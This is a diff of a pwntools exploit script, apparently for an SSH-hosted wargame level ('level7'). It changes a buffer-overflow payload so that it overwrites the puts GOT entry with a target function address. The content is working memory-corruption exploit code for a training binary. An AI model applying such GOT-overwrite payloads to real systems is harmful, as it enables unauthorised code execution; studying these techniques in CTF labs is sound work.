@@ -10,7 +10,7 @@ context.arch = 'i386'  # Architecture du binaire (32-bit)
 context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
 
 # Variables pour la connexion
-LOCAL = True  # Mettre à False pour l'exploitation SSH
+LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
 USER = "level7"  # Nom d'utilisateur SSH
@@ -61,8 +61,9 @@ def exploit():
         target_function = 0x080484f4
     log.info(f"Target function address: {target_function}")
 
+    puts_got_address = 0x08049928
 
-    payload1 = b"A" * (8 + 4) + p32(target_function)
+    payload1 = b"A" * (20) + p32(puts_got_address)
     log.info(f"Payload: {payload1}")
 
     payload2 = p32(target_function)
